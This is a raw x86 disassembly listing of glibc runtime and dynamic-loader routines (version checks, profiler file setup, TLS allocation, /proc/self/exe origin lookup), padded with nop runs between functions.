mov ecx, dword [var_50h_2]
inc ebx
cmp ebx, dword [ecx + 0x154]
jb 0x808234c
jmp 0x808213a
mov edx, dword [var_50h]
mov eax, dword [edx + 0x150]
mov edi, dword [eax + ebx*4]
jmp 0x808213c
lea eax, [var_19h]
mov byte [var_19h], 0
mov dword [var_sp_10h], 0
mov dword [esp + 0xc], 0xa
mov dword [var_8h], eax
mov dword [var_4ch], str.unsupported_version_
movzx eax, word [edx]
mov esi, 1
xor ebx, ebx
mov dword [var_4h], 0
mov dword [esp], eax
call fcn.08063ca0
mov dword [var_34h], str._of_Verneed_record_n
mov edx, dword [var_4ch]
mov dword [var_48h], eax
mov dword [var_44h], str._of_Verneed_record_n
mov dword [var_38h], eax
mov dword [var_3ch], edx
mov eax, dword [ebp + ebx*4 - 0x3c]
inc ebx
mov dword [esp], eax
call fcn.08053400
add esi, eax
cmp ebx, 2
jbe 0x80823db
lea eax, [esi + 0x12]
xor ebx, ebx
and eax, 0xfffffffc
sub esp, eax
lea esi, [var_23h]
and esi, 0xfffffff0
mov edx, esi
mov eax, dword [ebp + ebx*4 - 0x3c]
mov dword [esp], edx
inc ebx
mov dword [var_4h], eax
call fcn.080773c0
cmp ebx, 2
mov edx, eax
jbe 0x8082402
mov ecx, esi
jmp 0x8082310
mov dword [var_sp_ch], str._dl_check_map_versions
mov dword [var_8h_2], 0xe5
mov dword [var_4h_2], str.dl_version.c
mov dword [esp], str.needed_____void__0_
call fcn.0805efc0
lea esi, [esi]
lea edi, [edi]
push ebp
mov ebp, esp
push edi
xor edi, edi
push esi
push ebx
mov ebx, eax
sub esp, 8
test eax, eax
mov dword [var_14h], ecx
mov dword [var_10h], edx
je 0x808247b
xor esi, esi
test byte [ebx + 0x175], 2
je 0x8082485
mov ebx, dword [ebx + 0xc]
or edi, esi
test ebx, ebx
jne 0x8082467
add esp, 8
mov eax, edi
pop ebx
pop esi
pop edi
leave
ret
mov ecx, dword [var_14h]
mov edx, dword [var_10h]
mov eax, ebx
call fcn.08082090
test eax, eax
mov eax, 1
cmovne esi, eax
jmp 0x8082472
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
push ebp
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0x28c
mov esi, dword [0x80aac60]
mov dword [var_250h], 0
mov dword [var_240h], 0xffffffff
mov dword [var_244h], 0
movzx eax, word [esi + 0x14c]
mov ecx, dword [esi + 0x144]
shl eax, 5
lea eax, [eax + ecx]
cmp ecx, eax
jae 0x8082530
mov edx, dword [0x80aac74]
mov ebx, eax
mov dword [var_258h], edx
neg edx
mov dword [var_274h], edx
lea esi, [esi]
cmp dword [ecx], 1
je 0x8082bc0
add ecx, 0x20
cmp ecx, ebx
jb 0x8082520
mov edx, dword [esi]
mov eax, dword [var_240h]
mov dword [0x80aaa14], 0
mov ecx, dword [var_244h]
mov dword [0x80aaa38], 4
add eax, edx
lea edx, [edx + ecx + 3]
and eax, 0xfffffffc
and edx, 0xfffffffc
mov dword [0x80aaa30], eax
mov esi, edx
mov dword [var_25ch], edx
sub esi, eax
mov eax, 0x51eb851f
lea edx, [esi + esi*2]
mov edi, esi
mov dword [0x80aaa34], esi
mul edx
shr edi, 1
mov eax, 0x32
mov dword [var_24ch], edi
shr edx, 5
cmp edx, 0x31
cmova eax, edx
cmp eax, 0x100000
mov dword [0x80aaa28], eax
mov edx, eax
jbe 0x80825b2
mov edx, 0x100000
mov dword [0x80aaa28], 0x100000
lea eax, [edx*8]
xor ebx, ebx
mov ecx, 5
shl edx, 4
mov dword [var_260h], eax
lea edi, [var_8ch]
lea eax, [eax + edx]
shr esi, 2
mov edx, dword [var_24ch]
cld
lea eax, [edx + eax*4 + 0x40]
mov dword [var_254h], eax
mov eax, ebx
rep stosd dword es:[edi], eax
mov dword [var_a4h], esi
mov dword [var_8ch], 0x6e6f6d67
mov dword [var_88h], 0x1ffff
lea edi, [var_94h]
mov edx, dword [var_240h]
mov ecx, dword [var_244h]
mov dword [var_ach], edx
mov dword [var_a8h], ecx
call fcn.08090d00
mov dword [var_a0h], eax
mov ecx, 1
mov dword [var_9ch], 0x6f636573
cld
mov eax, ebx
mov dword [var_98h], 0x73646e
rep stosd dword es:[edi], eax
mov word [edi], 0
mov byte [edi + 2], 0
mov ebx, dword [0x80aabfc]
mov byte [var_8dh], 0x73
mov dword [esp], ebx
call fcn.08053400
mov esi, eax
mov eax, dword [0x80aac20]
mov dword [esp], eax
call fcn.08053400
lea eax, [eax + esi + 0x1c]
and eax, 0xfffffffc
sub esp, eax
lea edx, [var_27h]
and edx, 0xfffffff0
mov dword [var_264h], edx
mov dword [esp], edx
mov dword [var_4h], ebx
call fcn.080773c0
mov byte [eax], 0x2f
mov edx, dword [0x80aac20]
inc eax
mov dword [esp], eax
mov dword [var_4h], edx
call fcn.080773c0
mov dword [var_4h], str..profile
mov dword [var_8h], 9
mov dword [esp], eax
call fcn.08053740
mov dword [var_4h], 0x20042
mov dword [var_8h], 0x1b6
mov ecx, dword [var_264h]
mov dword [esp], ecx
call fcn.08053ec0
mov dword [var_278h], eax
inc eax
je 0x8082baf
lea eax, [var_6ch]
mov dword [var_8h], eax
mov edx, dword [var_278h]
mov dword [esp], 3
mov dword [var_4h], edx
call fcn.08053dc0
test eax, eax
js 0x8082723
mov eax, dword [var_5ch]
and eax, 0xf000
cmp eax, 0x8000
je 0x8082786
mov esi, str._s:_cannot_stat_file:__s_n
call fcn.08048b20
cmp dword [var_278h], 0xffffffff
mov ebx, dword [eax]
je 0x8082746
mov edi, dword [var_278h]
mov dword [esp], edi
call fcn.08053f20
lea eax, [var_23ch]
mov dword [var_8h], 0x190
mov dword [esp], ebx
mov dword [var_4h], eax
call fcn.08053300
mov dword [var_ch], eax
mov eax, dword [var_264h]
mov dword [var_4h], esi
mov dword [var_8h], eax
mov dword [esp], 2
call fcn.08081ca0
lea esp, [var_bp_ch]
pop ebx
pop esi
pop edi
leave
ret
mov esi, dword [var_3ch]
mov ebx, dword [var_40h]
mov ecx, esi
or ecx, ebx
mov dword [var_268h], ecx
jne 0x8082b71
mov edx, dword [0x80aac74]
mov dword [var_26ch], esp
cld
lea eax, [edx + 0x12]
mov ecx, edx
and eax, 0xfffffffc
shr ecx, 2
sub esp, eax
mov eax, dword [var_268h_2]
lea esi, [var_27h]
and esi, 0xfffffff0
test dl, 2
mov edi, esi
rep stosd dword es:[edi], eax
mov ebx, edi
je 0x80827d6
mov word [edi], 0
add ebx, 2
and edx, 1
je 0x80827de
mov byte [ebx], 0
mov dword [var_8h], 0
mov eax, dword [0x80aac74]
dec eax
not eax
and eax, dword [var_250h_2]
mov dword [var_4h], eax
mov eax, dword [var_274h]
mov dword [esp], eax
call fcn.08090150
inc eax
je 0x8082b61
mov eax, dword [0x80aac74]
dec eax
and eax, dword [var_250h_2]
mov dword [var_4h], esi
mov dword [var_8h], eax
mov edx, dword [var_274h]
mov dword [esp], edx
call fcn.08053fd0
cmp eax, 0xffffffff
mov ebx, eax
jne 0x8082840
call fcn.08048b20
cmp dword [eax], 4
je 0x808280d
test ebx, ebx
js 0x8082b61
mov esp, dword [var_26ch_2]
mov dword [var_14h], 0
mov esi, str._s:_cannot_map_file:__s_n
mov eax, dword [var_278h]
mov dword [var_ch], 1
mov dword [var_8h], 3
mov dword [var_10h], eax
mov edx, dword [var_254h]
mov dword [esp], 0
mov dword [var_4h], edx
call fcn.080546d0
mov dword [var_250h], eax
inc eax
je 0x8082728
mov ecx, dword [var_278h]
mov dword [esp], ecx
call fcn.08053f20
mov edx, dword [var_3ch]
mov esi, dword [var_250h]
mov ecx, dword [var_250h]
add esi, 0x38
mov edi, edx
mov eax, esi
add ecx, 0x14
mov dword [var_248h], esi
add eax, dword [var_24ch]
lea ebx, [eax + 4]
add eax, 8
mov dword [0x80aaa10], eax
mov dword [0x80aaa1c], ebx
mov eax, dword [var_40h]
or edi, eax
jne 0x8082ade
mov eax, dword [var_8ch_2]
mov edx, dword [var_250h_2]
mov dword [edx], eax
mov eax, dword [var_88h_2]
mov dword [edx + 4], eax
mov eax, dword [var_84h]
mov dword [edx + 8], eax
mov eax, dword [var_80h]
mov dword [edx + 0xc], eax
mov eax, dword [var_7ch]
mov dword [edx + 0x14], 0
mov dword [edx + 0x10], eax
mov eax, dword [var_ach_2]
mov dword [ecx + 4], eax
mov eax, dword [var_a8h_2]
mov dword [ecx + 8], eax
mov eax, dword [var_a4h_2]
mov dword [ecx + 0xc], eax
mov eax, dword [var_a0h_2]
mov dword [ecx + 0x10], eax
mov eax, dword [var_9ch_2]
mov dword [ecx + 0x14], eax
mov eax, dword [var_98h_2]
mov dword [ecx + 0x18], eax
mov eax, dword [var_94h_2]
mov dword [ecx + 0x1c], eax
mov eax, dword [var_90h]
mov dword [ecx + 0x20], eax
mov eax, dword [0x80aaa1c]
mov dword [eax - 4], 1
mov dword [var_4h], 1
mov eax, dword [var_24ch]
add eax, dword [var_260h]
mov dword [esp], eax
call fcn.08051730
test eax, eax
mov dword [0x80aaa20], eax
je 0x8082c13
mov eax, dword [0x80aaa20]
mov ecx, dword [0x80aaa1c]
mov dword [0x80aaa2c], 0
mov edx, dword [0x80aaa28]
mov edi, eax
mov dword [var_270h], eax
add edi, dword [var_24ch_2]
mov eax, dword [ecx]
cmp eax, edx
mov dword [0x80aaa24], edi
jae 0x80829ce
mov edx, dword [ecx]
test edx, edx
mov dword [0x80aaa18], edx
mov esi, edx
je 0x8082a3a
mov edx, dword [0x80aaa10]
lea eax, [esi + esi*2]
mov edi, dword [0x80aaa24]
lea ebx, [eax*4]
mov dword [var_274h], edx
mov eax, dword [var_274h]
sub ebx, 0xc
mov ecx, dword [eax + ebx + 4]
mov eax, dword [0x80aaa2c]
mov edx, eax
shr ecx, 2
inc eax
mov dword [0x80aaa2c], eax
mov eax, dword [var_274h]
add eax, ebx
dec esi
mov dword [edi + edx*8], eax
mov eax, dword [var_270h]
movzx eax, word [eax + ecx*2]
mov word [edi + edx*8 + 4], ax
mov eax, dword [var_270h]
mov word [eax + ecx*2], dx
jne 0x80829f6
mov ecx, dword [var_25ch_2]
mov eax, 0x10000
sub ecx, dword [0x80aaa30]
cmp dword [var_24ch_2], ecx
jae 0x8082a9b
xor edx, edx
mov eax, ecx
div dword [var_24ch_2]
mov ebx, eax
mov eax, 1
cmp ebx, 0xffff
ja 0x8082a9b
cmp ebx, 0xff
mov eax, 0x10000
ja 0x8082a97
cmp ecx, 0xffffff
jbe 0x8082acf
mov ebx, dword [var_24ch_2]
mov eax, ecx
xor edx, edx
shr ebx, 8
div ebx
mov ebx, eax
mov eax, 0x1000000
xor edx, edx
div ebx
mov dword [var_ch], eax
mov eax, dword [0x80aaa30]
mov dword [var_8h], eax
mov ecx, dword [var_24ch_2]
mov dword [var_4h], ecx
mov esi, dword [var_248h_2]
mov dword [esp], esi
call fcn.08090b50
mov dword [0x80aaa14], 1
jmp 0x808277e
shl ecx, 8
xor edx, edx
mov eax, ecx
div dword [var_24ch_2]
jmp 0x8082a90
mov esi, dword [var_250h]
mov ecx, 0x14
lea edi, [var_8ch]
cld
repe cmpsb byte [esi], byte ptr es:[edi]
jne 0x8082b1f
mov ecx, dword [var_250h]
mov eax, dword [ecx + 0x14]
test eax, eax
jne 0x8082b1f
mov esi, ecx
lea edi, [var_ach]
mov ecx, 0x20
add esi, 0x18
repe cmpsb byte [esi], byte ptr es:[edi]
jne 0x8082b1f
mov eax, dword [ebx - 4]
dec eax
je 0x808296e
mov edx, dword [var_250h]
test edx, edx
je 0x8082b41
mov ecx, dword [var_254h]
mov dword [var_4h], ecx
mov esi, dword [var_250h]
mov dword [esp], esi
call fcn.08054780
mov eax, dword [0x80aac20]
mov dword [var_ch], eax
mov edi, dword [var_264h]
mov dword [var_4h], str._s:_file_is_no_correct_profile_data_file_for___s_n
mov dword [var_8h], edi
jmp 0x8082772
mov esi, str._s:_cannot_create_file:__s_n
mov esp, dword [var_26ch_2]
jmp 0x8082728
mov eax, dword [var_254h]
cdq
mov dword [var_280h], eax
mov eax, dword [var_280h]
mov dword [var_27ch], edx
mov ecx, dword [var_27ch]
xor eax, ebx
xor ecx, esi
or ecx, eax
je 0x808284e
mov edx, dword [var_278h_2]
mov dword [esp], edx
call fcn.08053f20
jmp 0x8082b1f
mov esi, str._s:_cannot_open_file:__s_n
jmp 0x8082728
lea esi, [esi]
test byte [ecx + 0x18], 1
je 0x8082529
mov eax, dword [ecx + 8]
mov edx, dword [var_274h]
mov edi, dword [var_258h]
and edx, eax
add eax, dword [ecx + 0x14]
lea eax, [edi + eax - 1]
and eax, dword [var_274h]
cmp edx, dword [var_240h_2]
cmovae edx, dword [var_240h_2]
cmp eax, dword [var_244h_2]
cmovbe eax, dword [var_244h_2]
mov dword [var_240h_2], edx
mov dword [var_244h_2], eax
jmp 0x8082529
mov esi, dword [var_254h]
mov dword [var_4h], esi
mov edi, dword [var_250h]
mov dword [esp], edi
call fcn.08054780
mov dword [var_4h], str.Out_of_memory_while_initializing_profiler_n
mov dword [esp], 2
call fcn.08081ca0
mov dword [esp], 0x7f
call fcn.08053d90
nop
lea esi, [esi]
push ebp
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0x1c
mov ecx, dword [0x80aaa14]
test ecx, ecx
je 0x8082e18
mov ecx, dword [0x80aaa30]
mov edx, dword [0x80aaa34]
mov eax, 0
sub dword [arg_8h], ecx
cmp dword [arg_8h], edx
cmovb eax, dword [arg_8h]
sub dword [arg_ch], ecx
cmp dword [arg_ch], edx
mov dword [arg_8h], eax
jae 0x8082e18
mov ecx, dword [0x80aaa38]
mov eax, dword [arg_ch]
mov edx, dword [0x80aaa20]
shr eax, cl
lea eax, [edx + eax*2]
mov dword [var_1ch], edx
mov dword [var_18h], eax
movzx eax, word [eax]
movzx eax, ax
test eax, eax
je 0x8082d03
mov esi, dword [0x80aaa24]
lea ebx, [esi + eax*8]
mov edx, dword [ebx]
mov eax, dword [edx]
cmp eax, dword [arg_8h]
je 0x8082e14
movzx ecx, word [ebx + 4]
test cx, cx
je 0x8082cf2
movzx eax, cx
lea ebx, [esi + eax*8]
movzx eax, word [ebx + 4]
test ax, ax
mov ecx, eax
je 0x8082e2e
mov edx, dword [ebx]
mov eax, dword [edx]
cmp eax, dword [arg_8h]
jne 0x8082cd4
mov eax, dword [edx]
cmp eax, dword [arg_8h]
je 0x8082e14
add ebx, 4
mov dword [var_18h], ebx
mov ebx, dword [0x80aaa1c]
mov edx, dword [0x80aaa18]
mov dword [var_24h], ebx
mov esi, dword [var_24h]
mov ebx, edx
mov eax, dword [esi]
cmp edx, eax
je 0x8082d9b
mov eax, dword [0x80aaa28]
cmp edx, eax
mov dword [var_28h], eax
jae 0x8082d9b
mov ecx, dword [0x80aaa10]
mov esi, dword [0x80aaa24]
mov edi, 1
mov dword [var_20h], ecx
lea eax, [edx + edx*2]
mov edx, dword [var_20h]
mov ecx, dword [edx + eax*4 + 4]
mov eax, edi
shr ecx, 2
lock xadd dword [0x80aaa2c], eax
mov dword [var_10h], eax
mov eax, dword [var_10h]
mov edx, dword [var_10h]
lea eax, [ebx + ebx*2]
inc edx
mov ebx, dword [var_20h]
lea eax, [ebx + eax*4]
mov ebx, dword [var_1ch]
mov dword [esi + edx*8], eax
movzx eax, word [ebx + ecx*2]
mov word [esi + edx*8 + 4], ax
mov word [ebx + ecx*2], dx
lock inc dword [0x80aaa18]
mov edx, dword [0x80aaa18]
mov ecx, dword [var_24h]
mov eax, dword [ecx]
mov ebx, edx
cmp edx, eax
je 0x8082d9b
cmp edx, dword [var_28h]
jb 0x8082d41
mov ebx, dword [var_18h]
movzx eax, word [ebx]
test ax, ax
jne 0x8082e20
mov eax, 1
mov esi, dword [var_24h]
mov ecx, eax
lock xadd dword [esi], ecx
cmp ecx, dword [0x80aaa28]
jae 0x8082e18
lock xadd dword [0x80aaa2c], eax
mov dword [var_14h], eax
mov eax, dword [var_14h]
mov eax, dword [var_14h]
mov esi, dword [arg_8h]
mov edx, dword [0x80aaa24]
inc eax
mov word [ebx], ax
movzx eax, word [ebx]
movzx eax, ax
lea ebx, [edx + eax*8]
mov edx, dword [0x80aaa10]
lea eax, [ecx + ecx*2]
shl eax, 2
mov word [ebx + 4], 0
lea ecx, [eax + edx]
mov dword [ecx], esi
mov dword [ebx], ecx
mov esi, dword [arg_ch]
mov dword [edx + eax + 8], 0
mov dword [edx + eax + 4], esi
lock inc dword [0x80aaa18]
mov edx, ecx
lock inc dword [edx + 8]
add esp, 0x1c
pop ebx
pop esi
pop edi
leave
ret
mov edx, dword [var_18h]
movzx eax, word [edx]
movzx eax, ax
jmp 0x8082cb5
mov edx, dword [ebx]
jmp 0x8082cf2
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
push ebp
mov ebp, esp
sub esp, 0x24
cmp byte [0x80aabe0], 0
mov dword [var_ch], ebx
mov dword [var_8h], esi
mov dword [var_4h], edi
jne 0x8082e75
mov ebx, dword [0x80aabd8]
lea eax, [ebx + 1]
mov dword [0x80aabd8], eax
mov edx, eax
mov ebx, dword [var_ch]
mov esi, dword [var_8h]
mov eax, edx
mov edi, dword [var_4h]
leave
ret
mov edx, dword [0x80aabe8]
mov ebx, dword [0x80aabd8]
mov dword [var_10h], 0
mov esi, dword [0x80aabdc]
inc edx
mov dword [var_14h], ebx
cmp edx, ebx
ja 0x8082f31
mov eax, edx
mov ecx, dword [esi]
sub eax, dword [var_10h]
cmp eax, ecx
jae 0x8082ec6
mov edi, dword [var_14h]
inc edi
lea esi, [esi]
mov eax, dword [esi + eax*8 + 0xc]
test eax, eax
je 0x8082ec6
inc edx
cmp edx, edi
ja 0x8082f10
mov eax, edx
sub eax, dword [var_10h]
cmp eax, ecx
jb 0x8082eb0
mov eax, edx
sub eax, dword [var_10h]
cmp eax, ecx
jb 0x8082ed9
mov esi, dword [esi + 4]
add dword [var_10h], ecx
test esi, esi
jne 0x8082e9a
cmp edx, dword [var_14h]
jb 0x8082e68
jne 0x8082eec
mov byte [0x80aabe0], 0
jmp 0x8082e5e
mov dword [var_sp_ch], str._dl_next_tls_modid
mov dword [var_sp_8h], 0x5f
mov dword [var_sp_4h], str..._sysdeps_generic_dl_tls.c
mov dword [esp], str.result___dl_tls_max_dtv_idx
call fcn.0805efc0
mov dword [var_sp_ch], str._dl_next_tls_modid
mov dword [var_sp_8h], 0x51
mov dword [var_sp_4h], str..._sysdeps_generic_dl_tls.c
mov dword [esp], str.result____dl_tls_max_dtv_idx__1
jmp 0x8082f0b
mov dword [var_sp_ch], str._dl_next_tls_modid
mov dword [var_sp_8h], 0x48
mov dword [var_sp_4h], str..._sysdeps_generic_dl_tls.c
mov dword [esp], str.result____dl_tls_max_dtv_idx
jmp 0x8082f0b
lea esi, [esi]
lea edi, [edi]
push ebp
mov ebp, esp
sub esp, 0x10
mov dword [var_8h], ebx
mov dword [var_4h], esi
mov dword [var_sp_4h], 4
mov ebx, eax
mov eax, dword [0x80aabd8]
lea esi, [eax + 0xe]
add eax, 0x10
mov dword [esp], eax
call fcn.08051730
test eax, eax
je 0x8082f9f
mov dword [eax], esi
add eax, 4
mov dword [ebx + 4], eax
mov eax, ebx
mov esi, dword [var_4h]
mov ebx, dword [var_8h]
leave
ret
xor ebx, ebx
jmp 0x8082f95
lea esi, [esi]
lea edi, [edi]
mov ecx, dword [0x80a95a4]
push ebp
mov ebp, esp
mov dword [eax], ecx
mov eax, dword [0x80aabd4]
mov dword [edx], eax
leave
ret
lea esi, [esi]
lea edi, [edi]
push ebp
mov ebp, esp
sub esp, 0x18
mov eax, dword [0x80aabd4]
mov dword [var_8h], esi
mov dword [var_ch], ebx
mov dword [var_4h], edi
mov esi, dword [0x80a95a4]
mov dword [esp], eax
mov dword [var_sp_4h], esi
call fcn.080513d0
test eax, eax
mov ebx, eax
mov edi, eax
je 0x808302a
lea ebx, [esi + eax - 0x420]
mov dword [var_sp_8h], 0x420
mov dword [var_sp_4h], 0
mov dword [esp], ebx
call fcn.080536f0
mov eax, ebx
call fcn.08082f60
test eax, eax
mov ebx, eax
je 0x8083037
mov eax, ebx
mov esi, dword [var_8h]
mov edi, dword [var_4h]
mov ebx, dword [var_ch]
leave
ret
mov dword [esp], edi
call fcn.08051180
jmp 0x808302a
jmp 0x8083050
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
push ebp
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0x1c
mov dword [var_10h], eax
mov ecx, dword [var_10h]
xor eax, eax
test ecx, ecx
je 0x8083115
mov eax, dword [var_10h]
mov dword [var_18h], 0
mov edi, dword [0x80aabdc]
mov ebx, dword [0x80aabd8]
mov eax, dword [eax + 4]
mov dword [var_14h], eax
mov edx, dword [var_18h]
mov ecx, dword [var_18h]
test edx, edx
mov edx, dword [edi]
sete al
movzx esi, al
cmp esi, edx
lea eax, [esi + ecx]
jae 0x80830de
lea esi, [esi]
mov eax, dword [var_18h]
add eax, esi
cmp eax, ebx
ja 0x80830de
mov ecx, dword [edi + esi*8 + 0xc]
test ecx, ecx
je 0x80830d3
mov eax, dword [ecx + 0x224]
test eax, eax
jne 0x808311d
mov eax, dword [ecx + 0x228]
mov edx, dword [var_14h]
mov dword [edx + eax*4], 0xffffffff
mov edx, dword [edi]
mov ebx, dword [0x80aabd8]
mov ecx, dword [var_18h]
inc esi
cmp esi, edx
lea eax, [esi + ecx]
jb 0x80830a0
mov dword [var_18h], eax
cmp dword [var_18h], ebx
mov eax, dword [var_10h]
jae 0x8083115
mov edi, dword [edi + 4]
test edi, edi
jne 0x8083085
mov dword [var_ch], str._dl_allocate_tls_init
mov dword [var_8h], 0x1bd
mov dword [var_4h], str..._sysdeps_generic_dl_tls.c
mov dword [esp], str.listp_____void__0_
nop
call fcn.0805efc0
add esp, 0x1c
pop ebx
pop esi
pop edi
leave
ret
cmp dword [ecx + 0x228], esi
jne 0x80831cb
mov edx, dword [ecx + 0x218]
cmp edx, dword [ecx + 0x214]
jb 0x80831a7
cmp eax, edx
jb 0x8083183
mov edx, dword [var_10h]
sub edx, eax
mov eax, dword [var_14h]
mov dword [eax + esi*4], edx
mov eax, dword [ecx + 0x214]
mov ebx, dword [ecx + 0x218]
mov dword [var_8h], eax
sub ebx, eax
mov eax, dword [ecx + 0x210]
mov dword [esp], edx
mov dword [var_4h], eax
call fcn.08053740
mov dword [var_4h], 0
mov dword [var_8h], ebx
mov dword [esp], eax
call fcn.080536f0
jmp 0x80830cb
mov dword [var_ch], str._dl_allocate_tls_init
mov dword [var_8h], 0x1a9
mov dword [var_4h], str..._sysdeps_generic_dl_tls.c
mov dword [esp], str._size_t__map__l_tls_offset___map__l_tls_blocksize
jmp 0x8083110
mov dword [var_ch], str._dl_allocate_tls_init
mov dword [var_8h], 0x1a7
mov dword [var_4h], str..._sysdeps_generic_dl_tls.c
mov dword [esp], str.map__l_tls_blocksize___map__l_tls_initimage_size
jmp 0x8083110
mov dword [var_ch], str._dl_allocate_tls_init
mov dword [var_8h], 0x1a6
mov dword [var_4h], str..._sysdeps_generic_dl_tls.c
mov dword [esp], str.map__l_tls_modid__cnt
jmp 0x8083110
nop
push ebp
test eax, eax
mov ebp, esp
je 0x8083202
call fcn.08082f60
leave
jmp 0x8083050
call fcn.08082fd0
jmp 0x80831fc
lea esi, [esi]
push ebp
mov ebp, esp
sub esp, 0xc
mov dword [var_8h], ebx
mov dword [var_4h], esi
mov ebx, edx
mov esi, eax
mov eax, dword [eax + 4]
sub eax, 4
mov dword [esp], eax
call fcn.08051180
test bl, bl
jne 0x8083240
mov ebx, dword [var_8h]
mov esi, dword [var_4h]
leave
ret
lea esi, [esi]
mov eax, esi
sub eax, dword [0x80a95a4]
lea esi, [eax + 0x420]
mov dword [esp], esi
call fcn.08051180
jmp 0x8083232
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
push ebp
mov edx, 0x1000
mov ebp, esp
sub esp, 0x101c
mov dword [var_4h], edi
mov dword [var_ch], ebx
mov dword [var_8h], esi
lea edi, [var_100ch]
mov ebx, str._proc_self_exe
mov ecx, edi
mov eax, 0x55
int 0x80
cmp eax, 0xfffff000
mov ebx, eax
ja 0x8083340
test eax, eax
jle 0x8083340
movzx eax, byte [var_100ch]
cmp al, 0x5b
je 0x8083340
cmp al, 0x2f
jne 0x80833a0
cmp ebx, 1
jle 0x80832f2
cmp byte [ebx + ebp - 0x100d], 0x2f
je 0x80832f2
dec ebx
cmp ebx, 1
jle 0x80832f2
cmp byte [ebx + ebp - 0x100d], 0x2f
jne 0x80832e2
lea eax, [ebx + 1]
mov dword [esp], eax
call fcn.08050fe0
test eax, eax
mov esi, eax
je 0x8083334
cmp ebx, 1
je 0x808332d
lea eax, [ebx - 1]
mov dword [var_sp_4h], edi
mov dword [esp], esi
mov dword [var_sp_8h], eax
call fcn.08053740
mov byte [eax], 0
mov esi, esi
mov eax, esi
mov ebx, dword [var_ch]
mov edi, dword [var_4h]
mov esi, dword [var_8h]
leave
ret
mov word [eax], 0x2f
jmp 0x8083320
mov esi, 0xffffffff
jmp 0x8083320
nop
lea esi, [esi]
mov eax, dword [0x80aac40]
mov esi, 0xffffffff
test eax, eax
je 0x8083320
mov dword [esp], eax
call fcn.08053400
mov ebx, eax
lea eax, [eax + 1]
mov dword [esp], eax
call fcn.08050fe0
test eax, eax
mov esi, eax
je 0x8083334
mov eax, dword [0x80aac40]
mov dword [var_sp_8h], ebx
mov dword [esp], esi
mov dword [var_sp_4h], eax
call fcn.08053740
lea edx, [esi + 1]
cmp eax, edx
jbe 0x808331b
cmp byte [eax - 1], 0x2f
jne 0x808331b
nop
lea esi, [esi]
dec eax
cmp eax, edx
jbe 0x808331b
cmp byte [eax - 1], 0x2f
je 0x8083390
jmp 0x808331b
mov dword [var_sp_ch], str._dl_get_origin
mov dword [var_sp_8h], 0x30
mov dword [var_sp_4h], str..._sysdeps_unix_sysv_linux_dl_origin.c
mov dword [esp], str.linkval_0____
call fcn.0805efc0
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
push ebp
mov ebp, esp
push edi
mov edi, eax
push esi
push ebx
sub esp, 0xc
mov eax, dword [eax]
mov edx, dword [0x80aac74]
mov esi, edx
neg esi
and esi, eax
cmp eax, dword [0x80aac00]
jne 0x80834d1
cmp byte [0x80aaa3c], 0
je 0x8083491
lea ebx, [edx*8]
add esi, edx
sub esi, ebx
mov dword [esp + 8], 7
mov dword [esp + 4], ebx
mov dword [esp], esi
call fcn.080547a0
test eax, eax
je 0x8083437
call fcn.08048b20
xor edx, edx
mov eax, dword [eax]
cmp eax, 0xd
je 0x8083487
cmp eax, 0xc
mov edx, eax
jne 0x8083487
cmp ebx, dword [0x80aac74]
je 0x8083478
mov eax, ebx
shr eax, 1
mov ebx, eax
add esi, eax
jmp 0x8083439
mov dword [edi], 0
or dword [0x80a95c8], 1
xor edx, edx
add esp, 0xc
mov eax, edx
pop ebx
pop esi
pop edi
leave
ret
mov dword [esp + 8], 0x1000007
mov dword [esp + 4], edx
mov dword [esp], esi
call fcn.080547a0
test eax, eax
je 0x8083478
call fcn.08048b20
mov eax, dword [eax]
cmp eax, 0x16
je 0x80834bf
xor edx, edx
cmp eax, 0xd
cmovne edx, eax
jmp 0x8083487
mov edx, dword [0x80aac74]
mov byte [0x80aaa3c], 1
jmp 0x808342e
mov edx, 1
jmp 0x8083487
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
push ebp
mov ebp, esp
sub esp, 8
mov eax, dword [arg_8h]
mov dword [var_4h], eax
mov eax, dword [arg_4h]
mov dword [esp], eax
call fcn.08082c50
leave
ret
lea esi, [esi]
push ebp
mov ebp, esp
sub esp, 8
mov eax, dword [0x80aac60]
test eax, eax
jne 0x8083531
leave
ret
mov eax, dword [arg_8h]
mov dword [var_4h], eax
mov eax, dword [arg_4h]
mov dword [esp], eax
call fcn.08082c50
jmp 0x808352f
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
push ebp
mov ecx, eax
mov ebp, esp
sub esp, 0x10
mov dword [esp], edx
lea eax, [var_ch]
mov dword [var_4h], ebx
lea edx, [var_8h]
mov dword [var_8h], 0
xor ebx, ebx
call fcn.08081410
mov edx, dword [var_8h]
sub esp, 4
test edx, edx
setne bl
test ebx, ebx
je 0x80835c1
cmp edx, str.out_of_memory
je 0x80835c1
mov dword [esp], edx
call fcn.08051180
mov eax, ebx
mov ebx, dword [var_4h]
leave
ret
nop
lea esi, [esi]
push ebp
xor ecx, ecx
mov ebp, esp
push ebx
mov ebx, dword [ebp + 8]
mov edx, dword [ebx + 4]
mov eax, dword [ebx]
call fcn.08055330
mov dword [ebx + 8], eax
